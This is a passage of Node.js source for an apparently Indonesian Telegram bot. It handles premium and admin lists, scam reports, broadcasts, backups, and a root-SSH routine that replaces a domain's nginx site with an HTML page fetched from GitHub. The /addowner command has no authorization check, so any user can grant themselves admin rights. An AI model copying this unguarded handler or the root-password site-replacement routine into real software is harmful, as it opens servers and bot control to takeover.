    { parse_mode: "Markdown" }
  );
});

const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to admin users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ 𝙼𝚒𝚜𝚜𝚒𝚗𝚐 𝚒𝚗𝚙𝚞𝚝. 𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚛𝚘𝚟𝚒𝚍𝚎 𝚊 𝚞𝚜𝚎𝚛 𝙸𝙳 and duration. 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ 𝙸𝚗𝚟𝚊𝚕𝚒𝚍 𝚒𝚗𝚙𝚞𝚝. 𝚄𝚜𝚎𝚛 𝙸𝙳 𝚖𝚞𝚜𝚝 𝚋𝚎 𝚊 𝚗𝚞𝚖𝚋𝚎𝚛. 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ 𝙸𝚗𝚟𝚊𝚕𝚒𝚍 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚏𝚘𝚛𝚖𝚊𝚝. 𝚄𝚜𝚎 𝚗𝚞𝚖𝚋𝚎𝚛𝚜 𝚏𝚘𝚕𝚕𝚘𝚠𝚎𝚍 𝚋𝚢 𝚍 (𝚍𝚊𝚢𝚜), 𝚑 (𝚑𝚘𝚞𝚛𝚜), 𝚘𝚛 𝚖 (𝚖𝚒𝚗𝚞𝚝𝚎𝚜). 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} 𝚊𝚍𝚍𝚎𝚍 ${userId} 𝚝𝚘 𝙿𝚛𝚎𝚖 𝚞𝚗𝚝𝚒𝚕 ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} 𝚑𝚊𝚜 𝚋𝚎𝚎𝚗 𝚊𝚍𝚍𝚎𝚍 𝚝𝚘 𝚝𝚑𝚎 𝙿𝚛𝚎𝚖 𝚕𝚒𝚜𝚝 𝚞𝚗𝚝𝚒𝚕 ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} 𝚒𝚜 𝚊𝚕𝚛𝚎𝚊𝚍𝚢 𝚊 𝚅𝚒𝚙 𝚞𝚜𝚎𝚛. 𝙴𝚡𝚙𝚒𝚛𝚊𝚝𝚒𝚘𝚗 𝚎𝚡𝚝𝚎𝚗𝚍𝚎𝚍 𝚞𝚗𝚝𝚒𝚕 ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ 𝚈𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚝𝚘 𝚟𝚒𝚎𝚠 𝚝𝚑𝚎 𝚅𝚒𝚙 𝚕𝚒𝚜𝚝.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 𝙽𝚘 𝚅𝚒𝚙 𝚞𝚜𝚎𝚛𝚜 𝚏𝚘𝚞𝚗𝚍.");
  }

  let message = "𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙻𝙸𝚂𝚃!!";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ 𝙼𝚒𝚜𝚜𝚒𝚗𝚐 𝚒𝚗𝚙𝚞𝚝. 𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚛𝚘𝚟𝚒𝚍𝚎 𝚊 𝚞𝚜𝚎𝚛 𝙸𝙳. 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /addowner 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /addowner 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an owner.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an owner.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ 𝚈𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚝𝚘 𝚛𝚎𝚖𝚘𝚟𝚎 𝚅𝚒𝚙 𝚞𝚜𝚎𝚛𝚜.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ 𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚛𝚘𝚟𝚒𝚍𝚎 𝚊 𝚞𝚜𝚎𝚛 𝙸𝙳. 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /delvip 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ 𝙸𝚗𝚟𝚊𝚕𝚒𝚍 𝚒𝚗𝚙𝚞𝚝. 𝚄𝚜𝚎𝚛 𝙸𝙳 𝚖𝚞𝚜𝚝 𝚋𝚎 𝚊 𝚗𝚞𝚖𝚋𝚎𝚛.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ 𝚄𝚜𝚎𝚛 ${userId} 𝚒𝚜 𝚗𝚘𝚝 𝚒𝚗 𝚝𝚑𝚎 𝚅𝚒𝚙 𝚕𝚒𝚜𝚝.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ 𝚄𝚜𝚎𝚛 ${userId} 𝚑𝚊𝚜 𝚋𝚎𝚎𝚗 𝚛𝚎𝚖𝚘𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 𝚝𝚑𝚎 𝚛𝚎𝚐𝚒𝚜 𝚕𝚒𝚜𝚝.`);
});

bot.onText(/\/delowner(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *𝙰𝚔𝚜𝚎𝚜 𝙳𝚒𝚝𝚘𝚕𝚊𝚔*\n𝙰𝚗𝚍𝚊 𝚝𝚒𝚍𝚊𝚔 𝚖𝚎𝚖𝚒𝚕𝚒𝚔𝚒 𝚒𝚣𝚒𝚗 𝚞𝚗𝚝𝚞𝚔 𝚖𝚎𝚗𝚐𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚒𝚗𝚒.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ 𝙼𝚒𝚜𝚜𝚒𝚗𝚐 𝚒𝚗𝚙𝚞𝚝. 𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚛𝚘𝚟𝚒𝚍𝚎 𝚊 𝚞𝚜𝚎𝚛 𝙸𝙳. 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /delowner 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ 𝙸𝚗𝚟𝚊𝚕𝚒𝚍 𝚒𝚗𝚙𝚞𝚝. 𝙴𝚡𝚊𝚖𝚙𝚕𝚎: /delowner 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} 𝚁𝚎𝚖𝚘𝚟𝚎𝚍 ${userId} 𝙵𝚛𝚘𝚖 𝙰𝚍𝚖𝚒𝚗`);
        bot.sendMessage(chatId, `✅ 𝚄𝚜𝚎𝚛 ${userId} 𝚑𝚊𝚜 𝚋𝚎𝚎𝚗 𝚛𝚎𝚖𝚘𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 𝚘𝚠𝚗𝚎𝚛.`);
    } else {
        bot.sendMessage(chatId, `❌ 𝚄𝚜𝚎𝚛 ${userId} 𝚒𝚜 𝚗𝚘𝚝 𝚊𝚗 𝚘𝚠𝚗𝚎𝚛.`);
    }
});

bot.onText(/^\/cekid(\s|$)/i, async (msg) => {
const chatId = msg.chat.id;
const user = msg.from;
const text = `𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : ${user.username ? '@' + user.username : '𝙽𝚐𝚐𝚊𝚍𝚊 𝙰𝚓𝚐'}
𝙸𝙳 : ${chatId}`;
bot.sendMessage(msg.chat.id, text, {
        parse_mode: 'Markdown',
        reply_to_message_id: msg.message_id
    });
}); 

const SSH_USER = "root";

const RAW_URL =
  "https://raw.githubusercontent.com/Raraaimupp/controlscarrydeath/refs/heads/main/web_source.html";

function normalizeDomain(d) {
  return String(d).replace(/^https?:\/\//, "").split("/")[0].trim();
}

function sshExec({ host, password, command, port = 22 }) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    conn
      .on("ready", () => {
        conn.exec(command, { pty: true }, (err, stream) => {
          if (err) return reject(err);
          let out = "", errOut = "";
          stream
            .on("close", (code) => {
              conn.end();
              if (code !== 0) return reject(new Error(errOut));
              resolve(out.trim());
            })
            .on("data", (d) => (out += d.toString()))
            .stderr.on("data", (d) => (errOut += d.toString()));
        });
      })
      .on("error", reject)
      .connect({
        host,
        port,
        username: SSH_USER,
        password,
      });
  });
}

/* ================= DEPLOY SCRIPT ================= */

function deployScript(domain) {
  return `
set -e
DOMAIN="${domain}"
ROOT="/var/www/thema/$DOMAIN"
CONF="/etc/nginx/sites-available/thema-$DOMAIN.conf"
LINK="/etc/nginx/sites-enabled/thema-$DOMAIN.conf"

mkdir -p "$ROOT"
curl -fsSL "${RAW_URL}" -o "$ROOT/index.html"
chmod 644 "$ROOT/index.html"

# disable old config for this domain
grep -Rsl "server_name[[:space:]]\\+$DOMAIN" /etc/nginx/sites-enabled 2>/dev/null | while read f; do
  rm -f "$f"
done || true

cat > "$CONF" <<EOF
server {
    listen 80;
    server_name $DOMAIN;
    root $ROOT;
    index index.html;
    location / {
        try_files \\$uri \\$uri/ /index.html;
    }
}
EOF

if [ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]; then
cat >> "$CONF" <<EOF

server {
    listen 443 ssl http2;
    server_name $DOMAIN;
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    include /etc/letsencrypt/options-ssl-nginx.conf;
    root $ROOT;
    index index.html;
    location / {
        try_files \\$uri \\$uri/ /index.html;
    }
}
EOF
fi

ln -sf "$CONF" "$LINK"
nginx -t
systemctl reload nginx
`;
}

/* ================= RESET SCRIPT ================= */

function resetScript(domain) {
  return `
set -e
DOMAIN="${domain}"
ROOT="/var/www/thema/$DOMAIN"
CONF="/etc/nginx/sites-available/thema-$DOMAIN.conf"
LINK="/etc/nginx/sites-enabled/thema-$DOMAIN.conf"

rm -f "$LINK"
rm -f "$CONF"
rm -rf "$ROOT"

nginx -t
systemctl reload nginx
`;
}


/* COMMAND & FUNCTION REPPORT SCAM */
function getScamSession(userId) {
  if (!scamReportSessions[userId]) {
    scamReportSessions[userId] = {
      step: 1,
      photos: [],
      awaitingInput: false,
      processing: false,
      lastMessageId: null,
      lastPromptMessageId: null,
      ignoreUntil: 0,
      lastAcceptedAt: 0,
      reporterId: null,
      reporterUsername: '',
      reporterFirstName: '',
      reporterLastName: ''
    };
  }
  return scamReportSessions[userId];
}

function clearScamSession(userId) {
  delete scamReportSessions[userId];
}

function formatReporterTag(session = {}) {
  const uname = String(session.reporterUsername || '').trim().replace(/^@+/, '');
  if (uname) return '@' + uname;
  const full = [session.reporterFirstName, session.reporterLastName].filter(Boolean).join(' ').trim();
  if (full && session.reporterId) return `${full} | ID: ${session.reporterId}`;
  return full || (session.reporterId ? `ID: ${session.reporterId}` : '-');
}

async function sendScamStep(chatId, userId, step) {
  const messages = {
    1: {
      text: `<b><tg-emoji emoji-id="5420315771991497307">🚨</tg-emoji> STEP 1/5 • BUKTI FOTO</b>

<blockquote>Silakan kirimkan <b>foto / screenshot</b> bukti chat atau transfer.
Kamu bisa mengirim lebih dari 1 foto.

<i>Kalau sudah cukup, tekan tombol <b>Lanjut ke Tahap Berikutnya</b>.</i></blockquote>`,
      keyboard: buildScamActionKeyboard(true)
    },
    2: {
      text: `<b><tg-emoji emoji-id="5368324170671202286">👤</tg-emoji> STEP 2/5 • DATA PELAKU</b>

<blockquote>Masukkan data pelaku.
<b>Format:</b> Username / Nama / No HP / Rekening

<i>Silakan balas dengan 1 pesan teks.</i></blockquote>`,
      keyboard: buildScamActionKeyboard(false)
    },
    3: {
      text: `<b>👥 STEP 3/5 • DATA KORBAN</b>

<blockquote>Masukkan data korban.
<b>Format:</b> Nama Anda / Username

<i>Silakan balas dengan 1 pesan teks.</i></blockquote>`,
      keyboard: buildScamActionKeyboard(false)
    },
    4: {
      text: `<b>💰 STEP 4/5 • TOTAL KERUGIAN</b>

<blockquote>Masukkan jumlah total kerugian.
<b>Contoh:</b> Rp 50.000

<i>Bot akan otomatis merapikan format nominal.</i></blockquote>`,
      keyboard: buildScamActionKeyboard(false)
    },
    5: {
      text: `<b><tg-emoji emoji-id="5431449001532594346">📝</tg-emoji> STEP 5/5 • KRONOLOGI</b>

<blockquote>Ceritakan kronologi kejadian secara singkat dan jelas.

<i>Contoh:</i> Saya melakukan transaksi, pelaku meminta transfer, lalu setelah uang dikirim pelaku menghilang dan tidak merespons lagi.</blockquote>`,
      keyboard: buildScamActionKeyboard(false)
    }
  };

  const current = messages[step];
  if (!current) return;
  const sent = await sendPremiumMessage(chatId, current.text, { parse_mode: 'HTML', reply_markup: current.keyboard });
  const session = getScamSession(userId);
  session.step = step;
  session.awaitingInput = step !== 1;
  session.processing = false;
  session.lastPromptMessageId = sent?.message_id || null;
  session.ignoreUntil = step === 1 ? Date.now() + 500 : 0;
  startMenuColorCycle(chatId, session.lastPromptMessageId, (i) => buildScamActionKeyboard(step === 1, i), 0);
}

async function submitScamReport(chatId, userId) {
  const session = scamReportSessions[userId];
  if (!session) return;

  const reporterTag = formatReporterTag(session);
  const caption = `<blockquote><b>🚨 SCAMMER REPORT 🚨</b></blockquote>

<blockquote><b>👤 PELAKU</b>
${escapeHtml(session.pelaku || '-')}

<b>👥 KORBAN</b>
${escapeHtml(session.korban || '-')}

<b>💰 TOTAL KERUGIAN</b>
${escapeHtml(session.total || '-')}

<b>📝 KRONOLOGI</b>
${escapeHtml(session.kronologi || '-')}

<b>🧾 USERNAME PELAPOR</b>
${escapeHtml(reporterTag)}</blockquote>

<blockquote><i>⚠️ Hati-hati dengan pelaku di atas. Gunakan rekber terpercaya saat transaksi.</i></blockquote>

#XYRAA #SCAMALERT #WASPADA`;

  for (const target of SCAM_REPORT_CHANNELS) {
    try {
      if (session.photos?.length) {
        await safeSendPhoto(target, session.photos[0], { caption, parse_mode: 'HTML' });
      } else {
        await safeSendMessage(target, caption, { parse_mode: 'HTML' });
      }
    } catch (e) {
      console.log('Gagal kirim laporan scam ke', target, e?.response?.body || e.message || e);
    }
  }

  clearScamSession(userId);
  await safeSendMessage(chatId, `<b><tg-emoji emoji-id="5195311729669309956">✅</tg-emoji> Laporan berhasil dikirim!</b>
Terima kasih telah melapor.`, { parse_mode: 'HTML' });
}

/* COMMAND ONLY XYRAA4SX */
bot.onText(/^\/maintenance(@\w+)?\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id
  const userId = String(msg.from.id)
  const mode = match[2].toLowerCase()
  const currentStatus = getMaintenance()

  if (!OWNER.includes(userId)) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Kamu bukan owner!</blockquote>`,
      { parse_mode: "HTML" }
    )
  }

  if (mode === "on" && currentStatus) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="5462921117423384478">🛠</tg-emoji> Maintenance sudah AKTIF sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    )
  }

  if (mode === "off" && !currentStatus) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> Maintenance sudah NONAKTIF sebelumnya.</blockquote>`,
      { parse_mode: "HTML" }
    )
  }

  if (mode === "on") {
    setMaintenance(true)
    bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="5462921117423384478">🛠</tg-emoji> Maintenance Mode AKTIF</blockquote>`,
      { parse_mode: "HTML" }
    )
  } else {
    setMaintenance(false)
    bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> Maintenance Mode NONAKTIF</blockquote>`,
      { parse_mode: "HTML" }
    )
  }
})

bot.onText(/^\/listuser(@\w+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!OWNER.includes(String(userId))) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="5805345674383855340">🚫</tg-emoji> Command ini hanya untuk owner.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const users = loadUsers();
  const userList = Object.values(users);

  if (userList.length === 0) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="5449800250032143374">📭</tg-emoji> Tidak ada user terdaftar.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const perPage = 20;
  const totalPages = Math.ceil(userList.length / perPage);
  const page = 1;

  const start = (page - 1) * perPage;
  const end = start + perPage;
  const pageData = userList.slice(start, end);

  let text = `<blockquote><b><tg-emoji emoji-id="4958506272551863292">📊</tg-emoji> TOTAL USER:</b> ${userList.length}\n`;
  text += `<b><tg-emoji emoji-id="5256113064821926998">📄</tg-emoji> Page:</b> ${page}/${totalPages}</blockquote>\n`;

  pageData.forEach((u, i) => {
    const safeName = escapeHtml(u.first_name);
    const safeUsername = u.username ? escapeHtml(u.username) : null;

    text += `<b>${start + i + 1}.</b> ${safeName} `;
    if (safeUsername) text += `(@${safeUsername}) <tg-emoji emoji-id="5208748315805499400">✅</tg-emoji>`;
    text += `\n<code>ID:</code> ${u.id}\n\n`;
  });

  const buttons = [];

  if (page > 1) {
    buttons.push({
      text: "Back",
      callback_data: `listuser_${page - 1}`,
      style : "danger",
      icon_custom_emoji_id: "5258236805890710909"
    });
  }

  if (page < totalPages) {
    buttons.push({
      text: "Next",
      callback_data: `listuser_${page + 1}`,
      style : "danger",
      icon_custom_emoji_id: "5260450573768990626"
    });
  }

  bot.sendMessage(chatId, text, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [buttons]
    }
  });
});

bot.onText(/^\/listgb(@\w+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!OWNER.includes(String(userId))) {
    return bot.sendMessage(chatId,
      `<blockquote><tg-emoji emoji-id="5805345674383855340">🚫</tg-emoji> Command ini hanya untuk owner.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  sendGroupList(chatId, 1);
});

bot.on("callback_query", async (query) => {
  const data = query.data;
  const userId = query.from.id;

  if (data.startsWith("listgb_")) {

    if (!OWNER.includes(String(userId))) {
      return bot.answerCallbackQuery(query.id, {
        text: "❌ Kamu tidak punya akses!",
        show_alert: true
      });
    }

    const page = parseInt(data.split("_")[1]);

    const groups = loadGroups();
    const perPage = 15;
    const totalPages = Math.ceil(groups.length / perPage);

    let validPage = Math.min(Math.max(page, 1), totalPages);

    const start = (validPage - 1) * perPage;
    const slice = groups.slice(start, start + perPage);

    let text = `<blockquote><tg-emoji emoji-id="5931718859366075705">📂</tg-emoji> <b>DAFTAR GROUP</b></blockquote>\n`;
    text += `<blockquote><tg-emoji emoji-id="5033080906403808074">📝</tg-emoji> Page ${validPage}/${totalPages}</blockquote>\n\n`;

    slice.forEach((g, i) => {
      text += `<b>${start + i + 1}.</b> ${g.title}\n`;
      text += `<code>${g.id}</code>\n`;
    });

    text += `\n<blockquote><tg-emoji emoji-id="5319169695897632605">💃</tg-emoji> <b>Total Group:</b> ${groups.length}</blockquote>`;

    let keyboard = { inline_keyboard: [] };
    let row = [];

    if (validPage > 1) {
      row.push({
        text: "Back",
        callback_data: `listgb_${validPage - 1}`,
        style: "danger",
        icon_custom_emoji_id: "5258236805890710909"
      });
    }

    if (validPage < totalPages) {
      row.push({
        text: "Next",
        callback_data: `listgb_${validPage + 1}`,
        style: "danger",
        icon_custom_emoji_id: "5260450573768990626"
      });
    }

    if (row.length) keyboard.inline_keyboard.push(row);

    await bot.editMessageText(text, {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id,
      parse_mode: "HTML",
      reply_markup: keyboard
    });

    bot.answerCallbackQuery(query.id);
  }
});

bot.on("message", async (msg) => {
  const userId = msg.from?.id;
  const chatId = msg.chat?.id;
  if (!userId || !chatId || msg.chat.type !== "private") return;

  const session = scamReportSessions[userId];
  if (!session) return;

  if (session.processing) return;
  if (session.step === 1 && session.ignoreUntil && Date.now() < session.ignoreUntil) return;
  if (session.step >= 2 && session.lastAcceptedAt && (Date.now() - session.lastAcceptedAt) < 700) return;

  if (msg.photo && session.step === 1) {
    const fileId = msg.photo[msg.photo.length - 1]?.file_id;
    if (fileId && !session.photos.includes(fileId)) session.photos.push(fileId);
    session.ignoreUntil = Date.now() + 500;
    await safeSendMessage(chatId, `<b>✅ Foto ke-${session.photos.length} diterima.</b>\nKirim foto lagi atau tekan <b>Lanjut ke Step Berikutnya</b> jika sudah cukup.`, { parse_mode: "HTML", reply_markup: buildScamActionKeyboard(true) });
    return;
  }

  if (!msg.text || msg.text.startsWith('/')) return;

  if (session.step === 1) {
    await safeSendMessage(chatId, `<b><tg-emoji emoji-id="5443038326535759644">📸</tg-emoji> Bukti belum ada.</b>
<blockquote>Kirim bukti dalam bentuk foto / screenshot dulu ya.</blockquote>`, { parse_mode: 'HTML', reply_markup: buildScamActionKeyboard(true) });
    return;
  }

  if (!session.awaitingInput) return;
  if (session.lastMessageId && session.lastMessageId === msg.message_id) return;

  const cleanText = msg.text.trim();
  if (!cleanText) return;

  session.processing = true;
  session.awaitingInput = false;
  session.lastMessageId = msg.message_id;
  session.lastAcceptedAt = Date.now();

  try {
    if (session.step === 2) {
      session.pelaku = cleanText;
      session.step = 3;
      await sendScamStep(chatId, userId, 3);
      return;
    }

    if (session.step === 3) {
      session.korban = cleanText;
      session.step = 4;
      await sendScamStep(chatId, userId, 4);
      return;
    }

    if (session.step === 4) {
      session.total = normalizeScamTotal(cleanText);
      session.step = 5;
      await sendScamStep(chatId, userId, 5);
      return;
    }

    if (session.step === 5) {
      session.kronologi = cleanText;
      await submitScamReport(chatId, userId);
      return;
    }
  } catch (err) {
    console.log('Scam flow error step', session?.step, ':', err?.response?.body || err?.message || err);
    session.awaitingInput = true;
    await safeSendMessage(chatId, `<b>❌ Terjadi error saat memproses laporan.</b>\nSilakan coba lagi perlahan.`, { parse_mode: 'HTML' }).catch(() => {});
  } finally {
    if (scamReportSessions[userId]) {
      scamReportSessions[userId].processing = false;
    }
  }
});

bot.onText(/^\/backup(@\w+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!OWNER.includes(String(senderId))) {
    return bot.sendMessage(
      chatId,
      `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> <b>Hanya owner yang bisa menggunakan fitur ini.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const loadingMsg = await bot.sendMessage(
    chatId,
    `<blockquote><tg-emoji emoji-id="5296778528145022661">⏳</tg-emoji> <b>Memulai proses backup...</b></blockquote>`,
    { parse_mode: "HTML" }
  );

  let dots = 0;
  const loadingInterval = setInterval(() => {
    dots = (dots + 1) % 4;

    bot.editMessageText(
      `<blockquote><tg-emoji emoji-id="5296778528145022661">⏳</tg-emoji> <b>Membackup file${".".repeat(dots)}</b></blockquote>`,
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: "HTML"
      }
    ).catch(() => {});
  }, 800);

  const sourceDir = __dirname;
  const backupName = `BACKUP SCRIPT SCARYDEATH V${VERSION} BY - 𝙲ᥣᥲⲩ.zip`;
  const outputPath = require("path").join(__dirname, backupName);

  const output = require("fs").createWriteStream(outputPath);

const archiver = require("archiver");
const archive = archiver("zip", {
  zlib: { level: 9 }
});

  archive.pipe(output);

  archive.glob("**/*", {
    cwd: sourceDir,
    ignore: [
      "node_modules/**",
      "package-lock.json",
      ".cache/**",
      ".npm/**",
      backupName
    ]
  });

  await archive.finalize();

  output.on("close", async () => {
    clearInterval(loadingInterval);

    const now = new Date();

    const tanggal = now.toLocaleDateString("id-ID", {
      weekday: "long",
      day: "numeric",
      month: "long",
      year: "numeric"
    });

    const getTime = (offset) =>
      new Date(now.getTime() + offset * 60 * 60 * 1000)
        .toTimeString()
        .split(" ")[0];

    const caption = `
<blockquote><b><tg-emoji emoji-id="5256094480498436162">📦</tg-emoji> BACKUP</b>

<tg-emoji emoji-id="5413879192267805083">📅</tg-emoji> <b>${tanggal}</b>

<tg-emoji emoji-id="5778605968208170641">🕒</tg-emoji> <b>WIB</b>  : ${getTime(7)}
<tg-emoji emoji-id="5778605968208170641">🕒</tg-emoji> <b>WITA</b> : ${getTime(8)}
<tg-emoji emoji-id="5778605968208170641">🕒</tg-emoji> <b>WIT</b>  : ${getTime(9)}

<tg-emoji emoji-id="5258514780469075716">📁</tg-emoji> <b>Size</b> : ${(archive.pointer() / 1024 / 1024).toFixed(2)} MB
</blockquote>`;

    await bot.sendDocument(OWNER[0], outputPath, {
      caption,
      parse_mode: "HTML"
    });

    await bot.editMessageText(
      `<blockquote><tg-emoji emoji-id="6334525098820636632">✅</tg-emoji> <b>Backup berhasil dikirim ke private owner.</b></blockquote>`,
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: "HTML"
      }
    ).catch(() => {});

    require("fs").unlinkSync(outputPath);
  });
});

bot.onText(/^\/bc$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!OWNER.includes(String(userId))) {
    return bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="4958526153955476488">❌</tg-emoji> Hanya owner yang bisa menggunakan broadcast.</blockquote>`, { parse_mode: "HTML" });
  }

  if (broadcastInProgress[userId]) {
    return bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="4958526153955476488">❌</tg-emoji> Broadcast sebelumnya masih berjalan, tunggu sampai selesai.</blockquote>`, { parse_mode: "HTML" });
  }

  broadcastState[userId] = { step: 'choose_type' };
  
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "User", callback_data: "broadcast_user", style : "primary", icon_custom_emoji_id: "5319287627109644494" },
          { text: "Group", callback_data: "broadcast_group", style : "primary", icon_custom_emoji_id: "5318942831430090639" }
        ],
        [
          { text: "All", callback_data: "broadcast_all", style : "success", icon_custom_emoji_id: "5316743524706698146" }
        ],
        [
          { text: "Batal", callback_data: "broadcast_cancel", style : "danger", icon_custom_emoji_id: "4956612582816351459" }
        ]
      ]
    }
  };

  bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="6269459131720012969">📣</tg-emoji> Pilih target broadcast:</blockquote>`, {
    ...options,
    parse_mode: "HTML"
  });
});

bot.on('callback_query', (query) => {
  const userId = query.from.id;
